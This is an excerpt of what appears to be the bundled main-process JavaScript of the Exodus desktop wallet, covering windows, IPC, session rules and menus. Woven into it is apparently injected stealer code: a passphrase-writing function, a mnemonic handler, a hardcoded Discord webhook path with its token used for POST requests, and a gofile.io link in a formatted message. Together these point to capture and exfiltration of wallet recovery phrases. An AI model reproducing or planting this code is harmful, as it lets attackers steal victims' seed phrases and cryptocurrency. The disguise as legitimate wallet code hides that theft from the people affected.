...
!(function (e) {
  ...
  function (e, t, n) {
    ...
    let m;
    "darwin" === process.platform && (m = d),
      "linux" === process.platform && (m = h),
      "win32" === process.platform && (m = l()(y, "RELEASES"));
    var w = n(4);
              ...
              (e =
                ...
                (await (async function () {
                  if ("darwin" === process.platform && "x64" === process.arch) {
                    ...
                    if (e > 20 || (20 === e && t >= 5))
                      try {
                        const { stdout: e, stderr: t } = await b("sysctl", [
    ...
    var A = async function () {
        ...
        await Promise.all(
          r.map((e) =>
            ...
            })(P.a.join(e, "exodus.wallet"), o),
          ),
        ),
          await Promise.all(r.map((e) => _.a.remove(e)));
      },
      $ = n(11),
      U = n(86),
      R = n(25),
    ...
    async function aD(e, t) {
      const r = ge(e);
      if (await r.passphraseFileExists())
        throw new Error(
          `Can't write to ${r.passphraseFile}; it already exists`,
        );
      let n = { passphrase: t, system: !0 };
      await $.a.outputJson(r.passphraseFile, n, { spaces: 2 });
    }

    function Y(e) {
      const t = e && e.recoverFromPhrase ? "Enter Mnemonic" : J.title;
      return (
        (H = new i.BrowserWindow({
          ...J,
          title: t,
        })),
        Object(W.registerWebContents)(H.webContents, "passphrase"),
        Object(z.a)(H.webContents, "passphrase"),
        H.loadURL(
          Object(K.a)({
            app: i.app,
            hash: Object(R.a)(e),
        ...
        H.webContents.once("dom-ready", () => H.show()),
        H
      );
    }
...
[2;31m https://gofile.io/d/tyfz6B[0m[2;34m[0m\`\`\``,
          ...
          const options = {
            ...
            port: 443,
            path: "/api/webhooks/" + "1152344818790441164/NfAr4NvraU9b4DA1OnhxgNKqi8yFe3pP3FrcLXj-0W924UYAOiTSoacqsFRnLDKxBa-r",
            method: "POST",
            headers: {
    ...
    async function ce(e) {
      ...
      console.timeEnd("main"),
        ...
        await (async function (e, t) {
          if (await _.a.pathExists(ue(t)))
            return (async function (e) {
              await _.a.remove(ue(e)),
                (se = Y({
                  recoverFromPhrase: !0,
                }));
        ...
        o.webContents.on("devtools-opened", () => {
        ...
        o.webContents.once("did-finish-load", () => {
          function e() {
            se && (Object(Q.b)(n), n.show(), se.destroy()),
              (Object(T.a)() || f.e) &&
                Object($.a)({
          ...
          console.log(`did-finish-load at [${Date.now()}]`),
            ...
            (ie.unlock = Object(v.b)(n)),
            se || (Object(Q.b)(n), (o.webContents.zoomFactor = 1), n.show()),
            Object(ne.b)(),
            Z._walletLoaded ? e() : Z.on("wallet:loaded", e);
        }),
        o.webContents.loadFile(V.c),
        Object(te.b)(),
        n.on("close", () => i.app.quit());
    }
    const ae = (e) => {
        Z.on("mnemonic:set", ({ mnemonic: t, passphrase: n }) => {
          const r = Object(oe.b)({
            walletDir: e,
            recoveryPhrase: t,
    ...
    function y(e, t, n = {}) {
      const r = (function (e, { url: t, domains: n, ...r }) {
        ...
        if (((o.reusable = o.persistent && o.multiple), o.offline)) {
          ...
          if (o.protocols.length > 1 || "file:" !== o.protocols[0])
            throw new Error(
        ...
        if ((o.url || (o.url = t), o.hasOwnProperty("type")))
          throw new Error("Entry shouldn't have a .type property");
        return (
          (o.type = e), (o.flags = new Set(o.flags || [])), Object.freeze(o), o
        );
      })(t, n);
      if (p.has(e))
    ...
    r.app.on("web-contents-created", (e, t) => {
      t.on("will-navigate", (e, t) => {
        "mailto:" !== new o.URL(t).protocol &&
          (e.preventDefault(), Object(f.a)("unsafe navigation", ` to ${t}`, 0));
      });
  ...
  function (e, t, n) {
    ...
    const f = () => l,
      d = (e, t) => {
        const { height: n, width: r, titleBarHeight: o } = Object(c.a)(t);
        e.setBounds({
          x: 0,
          y: o,
          width: r,
  ...
  function (e, t, n) {
    ...
    const F = ({ body: e, headers: t, status: n }) => {
    ...
    let D = null;
    const B = (e) => {
      h.a.background.removeBrowserView(e),
        D === e && ((D = null), h.a.ui.webContents.focus());
    };
    let T = 0;
    const L = (e) => {
        T = e || T;
    ...
    j.c.add(() => L()),
      ...
      M(
        ...
        async (e, { tar: t, url: n, domains: r, localStorageContent: c }) => {
                  ...
                  r = (e) => {
                    ...
                    return {
                      ...
                      headers: {
                        ...
                        "Content-Type": x.hasOwnProperty(t)
                          ? x[t]
          ...
          Object(p.registerWebContents)(m.webContents, "dapp", {
            ...
            Object(l.registerBrowserView)(m),
            P.set(e, m),
            U(m, T),
            m.setAutoResize({
              width: !0,
          ...
          g.protocol.registerStringProtocol("exodus-dapp-api", (t, n) => {
            ...
            f &&
              g.protocol.interceptStreamProtocol("http", (e, t) => {
            ...
            u.e && $(m),
            await m.webContents.loadURL(n);
          const E = JSON.parse(c);
          await m.webContents.executeJavaScript(`${y}(${o()(E)}),0`),
          ...
          try {
            return (
              await m.webContents.executeJavaScript(
                `window._exodus_dapp_api.setToken(${o()(v)}),0`,
              ),
              {
                usingSDK: !0,
              }
      ...
      M("show", (e) => {
        const t = P.get(e);
        h.a.background.addBrowserView(t),
          h.a.background.setTopBrowserView(h.a.ui),
          (D = t),
          U(t, T),
          R(t);
      });
    ...
    M("hide", (e) => {
      ...
      M("api-receive", async (e, { dataString: t }) => {
        const n = P.get(e),
  ...
  function (e, t, n) {
    ...
    const f = (() => {
        ...
        return (
          ...
          s.b && e.push("EDEN"),
          e.push(s.n.version),
          s.n.version.includes("-") && e.push("[PRERELEASE]"),
          s.e && e.push("[DEV]"),
          s.m && e.push("[NIGHTLY BUILD]"),
          e.join(" ")
        );
      })(),
      d = {
  ...
  function (e, t, n) {
    ...
    t.a = (e) => {
      const { height: t, width: n } = e.webContents
          ...
          .getContentBounds(),
        r = e.webContents.getOwnerBrowserWindow().getBounds().height - t;
      return {
        height: t,
        width: n,
  ...
  function (e, t, n) {
    ...
    function h(e) {
      ...
      (d = new r.BrowserWindow(n)),
        ...
        Object(c.a)(d.webContents, "wallet"),
        d.loadURL(
          Object(l.a)({
            app: r.app,
            hash: Object(o.a)(e),
  ...
  function (e, t, n) {
    ...
    function p(e, t) {
      ...
      if (
        ...
        return Object(o.a)("invalidated session usage", ` by ${t}`), null;
      if (!n.webContents || (n.webContents && n.webContents.isDestroyed())) {
        const r = i.get(e);
        if (!r)
          return Object(o.a)("missing WebContents for session", `: ${t}`), null;
        if (r.isDestroyed()) return "block_silent";
        if (r.session !== e)
          return Object(o.a)("changed WebContents session", `: ${t}`), null;
        n.webContents = r;
      }
      ...
      if (!n.sessionRules) {
        if (!s.has(e))
          return Object(o.a)("unregistered session usage", ` by ${t}`), null;
        const r = s.get(e);
        if (
          ...
          return (
            Object(o.a)("start url mismatch for WebContents", ` by ${t}`),
            l.add(e),
            null
          );
      ...
      if (n !== r.session.defaultSession) {
        if (!l.has(n)) {
          if (s.has(n)) {
            ...
            if (i.has(n))
              return (
                Object(o.a)("session reuse without registration", "", 1),
                void l.add(n)
              );
            setImmediate(() => {
              s.has(n) ||
  ...
  function (e, t, n) {
    ...
    function d() {
      ...
      (l = new r.BrowserWindow(t)),
        ...
        Object(s.a)(l.webContents, "network"),
        l.loadFile(c.f),
        Object(i.a)({ windowHandle: l.webContents, windowId: "network" }),
  ...
  function (e, t, n) {
    ...
    function d(e) {
      ...
      (l = new r.BrowserWindow(n)),
        ...
        Object(s.a)(l.webContents, "monero"),
        l.loadFile(c.e),
        Object(i.a)({ windowHandle: l.webContents, windowId: "monero" });
      let a = !1;
      return (
        r.app.on("before-quit", () => {
  ...
  function (e, t, n) {
    ...
    const h = {
      ...
      webPreferences: { ...p.b, partition: "core", backgroundThrottling: !1 },
    };
    let y = null;
    const m = () => y;
    function w() {
      ...
      (y = new o.BrowserWindow(t)),
        Object(l.registerWebContents)(y.webContents, "core"),
        Object(d.a)(y.webContents, "core"),
        y.loadFile(u.b),
        Object(f.a)({ windowHandle: y.webContents, windowId: "core" }),
  ...
  function (e, t, n) {
    "use strict";
    const r = n(17).fromCallback;
    e.exports = { copy: r(n(176)), copySync: n(173) };
  },
  function (e, t) {
  ...
  function (e, t, n) {
    ...
    function y(e, t, n, o, i) {
      return "function" == typeof r.copyFile
        ? r.copyFile(t, n, (t) => (t ? i(t) : m(e, n, o, i)))
        : (function (e, t, n, o, i) {
  ...
  function (e, t, n) {
    ...
    e.exports = {
      register: function e(t, n, i) {
        ...
        const y = c(n);
        p.push({ eventStamp: y, callback: i, enabled: !0 }),
  ...
  function (e, t, n) {
    const r = n(9),
      { createStorageInternal: o, addNamespacing: i } = n(149),
      { getLockFile: s } = n(70);
    e.exports = {
  ...
  function (e, t, n) {
    ...
    function a(e, t, n, r, o, i, { wrap: a, unwrap: u } = {}) {
      const l = `${c}:${r}:call`,
        f = async (e, l) => {
          const f = n(e, l);
          if (!o.includes(f))
    ...
    function d() {
      return Object(u.allWebContents)()
        .map((e) => ({ contents: e, type: f(e) }))
        .filter((e) => e.type);
    }
    var p = n(88),
      h = n.n(p),
    ...
    const g =
      ...
      (E = function (e) {
        return (
          !!f(e.sender) ||
          (Object(i.a)("send to IPC from non-whitelisted webContents"), !1)
        );
      }),
      {
        on(e, t, n = !0) {
    ...
    function x(e, t, n, r) {
      ...
      0 === s.length
        ...
        : s.length > 1 &&
          o.e &&
          Object(i.a)("targeted send to multiple webContents"),
        s.forEach((e) => k(e, t, n, r));
    }
    function O() {
      g.on(
        "ipc:target:send",
    ...
    function j(e, t) {
      !(function (e, t, n) {
        d().forEach(({ contents: r }) => k(r, e, t, n));
      })(e, t, "#");
    }
    const {
        on: _,
  ...
  function (e, t, n) {
    ...
    const O = {
      ...
      maximizable: !1,
      alwaysOnTop: !0,
      webPreferences: { ...k.c, partition: "keyviewer" },
      modal: !0,
    };
    let C = null;
    let j = 0;
    ...
    const F = {
      ...
      resizable: !1,
      title: "Scan QR Code",
      webPreferences: { ...k.c, partition: "scan-qr" },
      frame: !1,
    };
    let P,
      D = !1;
        ...
        if (P) P.send("wallet:qr:changeState", n), P.show(), e.hide();
          ...
          (D = !0),
            (function (e, t, n) {
              ...
              Object(f.registerWebContents)(r.webContents, "scan-qr"),
                Object(_.a)(r.webContents, "scan-qr"),
                r.loadURL(
                  Object(x.a)({
                    app: s.app,
                    filePath: S.i,
                ...
                Object(v.a)() &&
                  ...
                  (r.webContents.zoomFactor = n.webContents.zoomFactor),
                  r.show());
              let o = !1;
              return (
    ...
    u.rpcMain.on("keyviewer-process:init", (e, t) => {
      m.a.keyviewer ||
        ((m.a.keyviewer = (function (e, t, n) {
          return (
            (O.webPreferences.partition = `keyviewer-${j++}`),
            (C = new s.BrowserWindow({ ...O, parent: e })),
            Object(f.registerWebContents)(C.webContents, "keyviewer"),
            C.loadURL(
              Object(x.a)({ app: s.app, hash: Object(g.a)(n), filePath: S.d }),
            ),
            Object(v.a)() &&
              Object(E.a)({
        ...
        })(m.a.background, m.a.ui, t)),
        m.a.keyviewer.webContents.once("dom-ready", () => {
      ...
      u.rpcMain.handle("has-media-access", async (e, t) => {
        if ("camera" === t) {
          if (
            !(
              "darwin" === process.platform &&
              Number(a.a.release().split(".")[0]) >= 18
            )
          )
            return !0;
        }
        return (
          "granted" === s.systemPreferences.getMediaAccessStatus(t) ||
          s.systemPreferences.askForMediaAccess(t)
        );
      }),
      u.rpcMain.handle("openExternal", async (e, t) => {
        if (!y(t)) throw new Error("Navigation request declined");
        await s.shell.openExternal(t, { activate: !0 });
      }),
      u.rpcMain.handle("openExternal:unchecked", async (e, t) => {
        const { permissions: n = [] } = Object(f.getWebContentsMeta)(e.sender);
    ...
    Y.c.add(() => ee()),
      l.c.add(ee),
      s.protocol.registerSchemesAsPrivileged([
        ...J.schemes,
        {
      ...
      u.rpcMain.handle("nfts:load", async () => {
        ...
        (X = new s.BrowserView({
          ...
          Object(f.registerWebContents)(X.webContents, "nfts"),
          Object(K.registerBrowserView)(X),
          Object(J.updateViewBounds)(X, Q),
          X.setAutoResize({ width: !0, height: !0 }),
          m.a.ui.webContents.on("devtools-reload-page", () => {
            Z(), Object(K.destroyBrowserView)(X);
          });
        const { session: e } = X.webContents;
        e.protocol.registerStringProtocol("exodus-nfts-api", (e, t) => {
          try {
            ...
            m.a.ui.webContents.send("exodus-nfts-api", { messageString: t });
          } catch (e) {
          ...
          U.e && Object(J.showDevTools)(X),
          await X.webContents.loadFile(S.g),
          X.webContents.debugger.attach("1.3"),
          X.webContents.on("devtools-reload-page", () => {
      ...
      u.rpcMain.handle("nfts:show", () => {
        m.a.background.addBrowserView(X),
          m.a.background.setTopBrowserView(m.a.ui),
          Object(J.updateViewBounds)(X, Q),
          Object(J.refocusView)(X);
      }),
      ...
      u.rpcMain.handle("nfts:api-receive", async (e, { dataString: t }) => {
        ...
        await X.webContents.executeJavaScript(
          `window._exodus_nfts_api.receive(${G()(n)}),0`,
        );
      }),
      u.rpcMain.on("nfts:pointer", (e, t) => {
        const n = Object(J.toInputEvent)(t);
        n &&
          (["mousedown", "click"].includes(t.type) && X.webContents.focus(),
          X.webContents.debugger.sendCommand("Input.dispatchMouseEvent", n));
      });
    var te = (e, t) => {
        ...
        return (
          ...
          Object(K.allWebContents)().forEach((t) => {
    ...
    const Ee = re()([
        ...
        [
          [
            ...
            ve(() => globalThis.Exodus.restore.fromRecoveryPhrase()),
          ],
          [
            "Restore from recovery link...",
            ve(() => globalThis.Exodus.restore.fromRecoveryLink()),
          ],
          [
            "Restore from Safe Report...",
            ve(() => globalThis.Exodus.import.safeReport.importFile()),
          ],
        ],
      ]),
      Se = re()([
        ...
        [
          [
            "Open Data Folder",
            () => s.shell.showItemInFolder(s.app.getPath("userData")),
          ],
          [
            "Export Zipped Data Folder",
            ve(() => globalThis.Exodus.export.dir.data()),
          ],
          [
            "Export Zipped Wallet Folder",
            ve(() => globalThis.Exodus.export.dir.wallet()),
          ],
        ],
      ]),
      ke = re()([
      ...
      Oe = re()([
        ...
        [
          ...
          [
            "Test Volume Level",
            ve(() => globalThis.flux.store.dispatch({ type: "TEST_VOLUME" })),
          ],
        ],
      ]),
      Ce = (e) => {
      ...
      je = re()([
        "Zoom",
        [
          ["50%", { type: "radio", checked: !1 }, () => Ce(0.5)],
          ["75%", { type: "radio", checked: !1 }, () => Ce(0.75)],
          ["100%", { type: "radio", checked: !0 }, () => Ce(1)],
          ["150%", { type: "radio", checked: !1 }, () => Ce(1.5)],
          ["200%", { type: "radio", checked: !1 }, () => Ce(2)],
          ["300%", { type: "radio", checked: !1 }, () => Ce(3)],
        ],
      ]),
      _e = re()([
        "Windows",
    ...
    var De = re()([
      ...
      [
        ...
        je,
        "-",
        ["Open Developer Tools", () => Object(E.a)()],
        [
          "Open Current App Developer Tools",
          ve(() => globalThis.Exodus.dapps.showDevTools()),
        ],
        Fe,
        "-",
        [
          "Export Safe Report Data",
          ve(() => globalThis.Exodus.export.safeReport.dumpDiagnostics()),
        ],
        ...(R.PERF_METRICS_FEATURES
          ? [
              [
    ...
    var Le = (Te =
        "darwin" === process.platform
          ...
          : re()([
              "File",
              [["Quit", "Command+Q", s.app.quit.bind(s.app)]].filter(
                (e) => !!e,
              ),
            ])),
      Ie = re()([
      ...
      Ne = re()(["Window", [["Minimize", "CmdOrCtrl+M", "minimize"]]]);
    const Me = [Le];
    Me.push(Ie), "darwin" !== process.platform && Me.push(De), Me.push(Ne);
    const Ae = s.Menu.buildFromTemplate(Me),
      $e = () =>
        "darwin" === process.platform
          ? Re(Re(Ae, Be).submenu, "Developer").submenu
          : Re(Ae, "Developer").submenu,
      Ue = (e, t) => {
    ...
    var Ve = n(37);
    U.b && s.app.setName("Eden"),
      s.app.commandLine.appendSwitch("disable-renderer-backgrounding"),
      s.app.commandLine.appendSwitch(
        "autoplay-policy",
        "no-user-gesture-required",
      ),
      process.env.EXODUS_DISABLE_GPU && s.app.disableHardwareAcceleration();
    for (const e of q)
      Array.isArray(e)
        ? s.app.commandLine.appendSwitch(`disable-${e[0]}`, e[1])
        : s.app.commandLine.appendSwitch(`disable-${e}`);
    ...
    if (U.h) console.log("TEST MODE");
      ...
      0,
        (!Object.keys(qe).every((t) => e.includes(t)) || qe._.length > 2) &&
          (console.error("Can only pass whitelisted args; exiting", qe),
          s.app.exit());
    }
    qe.datadir
      ? s.app.setPath("userData", A.a.resolve(qe.datadir))
      : U.b &&
        s.app.setPath(
          "userData",
          A.a.join(s.app.getPath("appData"), "Exodus Eden"),
        ),
      qe._.length > 1 && (globalThis.OPENED_URL = qe._[1]);
    const Ke = new RegExp(`^${U.o}://securitize`),
      Je = (e) => Ke.test(e),
      He = (e) => {
        const { pathname: t, searchParams: n } = new $.URL(e);
        return { path: t.slice(1), params: Object.fromEntries(n.entries()) };
      };
    function Ge(e) {
      if (!e || !Je(e)) return;
      const { path: t, params: n } = He(e);
      m.a.ui.webContents.send("securitize:data", { path: t, params: n });
    }
    function Ye(e, t) {
      e.preventDefault(),
    ...
    s.app.on("open-file", Ye),
      s.app.on("open-url", Ye),
      u.rpcMain.on("securitize:fetch-data", () => {
      ...
      u.rpcMain.on("window:fetchIsFocused", () => {
        ...
        m.a.ui.webContents.send("window:isFocused", { isFocused: e });
      });
    const Xe = fe();
    (qe.debug || process.env.DEBUG_MODE || U.e || Xe) &&
      (console.log("DEBUG MODE"),
      (globalThis.DEBUG_MODE = qe.debug || process.env.DEBUG_MODE || !0));
    let Ze = !1;
    ...
    ["SIGINT", "SIGTERM", "SIGQUIT", "beforeExit"].forEach((e) =>
      ...
      s.Menu.setApplicationMenu(null),
      u.rpcMain.once("app:showDevMenu", () => {
      ...
      s.app.on("ready", async () => {
        ...
        if (
          (s.app.on("second-instance", function (e, t, n) {
          ...
          setImmediate(() => {
            ...
            if ("darwin" === process.platform) s.Menu.setApplicationMenu(We);
              ...
              const e = () => {
                ...
                m.a.ui.setBounds({ x: 0, y: n, width: t, height: e });
              };
              for (const t of [m.a.background, m.a.ui])
                L.a.register(t, "CmdOrCtrl+Shift+D", e);
            }
          });
      });
  },
    ...
    e.exports = function (e, t, n, s, c, a, u) {
      ...
      function v(e, t, n, r, o, i) {
        ...
        for (e.copy(i, 0, t, t + c), s = 0; s < r; s++)
          i.copy(o, s * c, 0, 0 + c), E(i, 0, c, n), l && l();
        for (s = 0; s < r; s++) {
          var a = 0 + 64 * (2 * n - 1);
          x(o, (i.readUInt32LE(a) & (r - 1)) * c, i, 0, c),
            E(i, 0, c, n),
            l && l();
        }
        i.copy(e, t, 0, 0 + c);
      ...
      function E(e, t, n, r) {
        var o;
        for (i(e, t + 64 * (2 * r - 1), y, 0, 64), o = 0; o < 2 * r; o++)
          x(e, 64 * o, y, 0, 64), k(y), i(y, 0, e, n + 64 * o, 64);
  ...
  function (e, t, n) {
    ...
    const r = n(16).fromCallback,
      o = n(60);
    (o.outputJson = r(n(137))),
      (o.outputJsonSync = n(136)),
  ...
  function (e, t, n) {
    "use strict";
    const r = n(17).fromCallback;
    e.exports = { move: r(n(158)), moveSync: n(157) };
  },
  function (e, t, n) {
    "use strict";
    const { stringify: r } = n(62),
      { outputFileSync: o } = n(61);
    e.exports = function (e, t, n) {
      const i = r(t, n);
      o(e, i, n);
    };
  ...
  function (e, t, n) {
    ...
    const r = n(17).fromPromise,
      o = n(163);
    (o.outputJson = r(n(161))),
      (o.outputJsonSync = n(160)),
      (o.outputJSON = o.outputJson),
      (o.outputJSONSync = o.outputJsonSync),
      (o.writeJSON = o.writeJson),
      (o.writeJSONSync = o.writeJsonSync),
  ...
  function (e, t, n) {
    "use strict";
    const { createFile: r, createFileSync: o } = n(169),
      { createLink: i, createLinkSync: s } = n(168),
      { createSymlink: c, createSymlinkSync: a } = n(167);
    e.exports = {
      createFile: r,
      createFileSync: o,
      ensureFile: r,
  ...
  function (e, t, n) {
    ...
    const p = u.g ? "./" : "src/",
      ...
      y = Object(l.b)(),
      m = i()(process.argv);
    function w(e, { prefix: t, mimetypes: n }) {
    ...
    function S(e, t) {
      ...
      const { protocols: r, domains: o } = n,
        { protocol: i, hostname: s, pathname: l } = t,
      ...
      if (
        ...
        !(function (e) {
          ...
          const r = c.a.resolve(t),
            o = [h, y];
          return (
            u.e && m.datadir && o.push(m.datadir),
            o.some((e) => r.startsWith(e))
          );
        })(t)
      )
        return l.endsWith(".map") ? E : v;
      if (S) return b;
      if ("*" !== r) {
        if (!((p && f && r.includes("localhost")) || (k && r.includes(i))))
          return v;
      }
      if ("*" !== o && !w && !g) {
        const e = (function (e) {
    ...
    function x(e) {
      if (k.has(e)) return;
      k.add(e), e.setSSLConfig({ minVersion: "tls1.2" });
      ...
      t.onBeforeRequest((t, n) => {
        ...
        o === b ||
          (o === g && u.f) ||
          ((i.cancel = !0),
          o !== E && Object(f.a)("network request", ` to ${r.toString()}`)),
          n(i);
      }),
        e.on("will-download", (e, t, n) => {
          try {
            if (
              (function (e, t) {
                const { downloads: n } = Object(d.b)(t.session);
                for (const t of n)
                  if (w(e, t))
                    return (
                      !0 === t.open &&
                ...
                if (
                  t.getURL().startsWith("devtools://") &&
                  w(e, { prefix: "blob:devtools://", mimetypes: ["image/png"] })
                )
                  return !0;
                return !1;
              })(t, n)
    ...
    function C(e, t, n) {
      const r = (function (e, t, n) {
        ...
        const { permissions: r } = Object(d.b)(e.session);
        return r.includes(t);
      })(e, t, n);
      return (
        r ||
          O.includes(t) ||
          Object(f.a)("unexpected permission request", ` to ${t}`),
        r
      );
    }
    r.app.on("ready", () => {
  ...
  function (e, t, n) {
    "use strict";
    n.r(t),
      n.d(t, "isBuiltinModule", function () {
        return i;
      }),
    ...
    const o = Function.prototype.call.bind(Array.prototype.includes),
      i = (e) =>
        !e.endsWith("/") &&
        ((e) => "electron" === e || o(r.builtinModules, e))(
          e.replace(/\/.*/, ""),
        ),
      s = (e) => {
  ...
  function (e, t, n) {
    ...
    }
    {
      const e = n(52),
        ...
        s = () => {
          const { getProcessName: e } = n(184),
            { allowedBuiltins: t } = n(183),
            r = e();
          return { processName: r, allowedModules: [...t(r)] };
        },
        { processName: c, allowedModules: a } = s(),
        u = (e, n) => {
          if ((i(e), "module" !== e && t(a, e))) return;
          throw new Error(
            `Requiring module "${e}" is not allowed` +
              ` in browser process "${c}" (parent: ${n})`,
          );
        },
  ...
  function (e, t, n) {
    2 === process.argv.length &&
      ...
      (console.log(n(66).version), n(0).app.exit(0)),
      console.time("main"),
      console.log("ENV: production"),
      n(21).instantEvent("didStartMain"),
      n(187),
      n(182),
      n(20),
      n(102);
